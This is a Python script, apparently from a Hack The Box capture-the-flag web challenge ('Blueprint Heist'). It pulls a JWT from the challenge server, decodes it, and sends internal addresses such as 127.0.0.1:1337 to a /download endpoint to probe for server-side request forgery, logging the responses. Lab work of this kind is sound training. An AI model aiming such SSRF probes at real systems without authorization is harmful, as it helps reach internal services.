import json, re, urllib.parse, urllib.request, urllib.error, pathlib

base = "http://154.57.164.68:31206"
ev = pathlib.Path(r"D:\download\CTFTimeWriteup\HTB-TryOut\web\Blueprint Heist\solve\evidence")


def http(url, data=None, timeout=60):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def extract_err(html: bytes) -> str:
    t = html.decode("utf-8", "replace")
    m = re.search(r"<p>(.*?)</p>", t, re.S)
    return (m.group(1) if m else t)[:800]


code, tok = http(base + "/getToken")
user = tok.decode().strip()
# decode jwt payload
import base64
def pad(s):
    return s + "=" * (-len(s) % 4)
payload = json.loads(base64.urlsafe_b64decode(pad(user.split(".")[1])))
header = json.loads(base64.urlsafe_b64decode(pad(user.split(".")[0])))
print(f"Q: issued JWT header/payload? |+ h={header} p={payload} | -")

urls = [
    "http://127.0.0.1:1337/",
    "http://127.0.0.1:1337",
    "http://example.com/",
    "https://example.com/",
]
for u in urls:
    st, body = http(
        f"{base}/download?token={urllib.parse.quote(user)}",
        urllib.parse.urlencode({"url": u}).encode(),
        timeout=70,
    )
    err = extract_err(body)
    (ev / ("dbg_dl_" + str(abs(hash(u))) + ".txt")).write_text(f"url={u}\nstatus={st}\n{err}\n", encoding="utf-8")
    print(f"Q: download {u}? |+ status={st} err={err[:180]!r} | -")
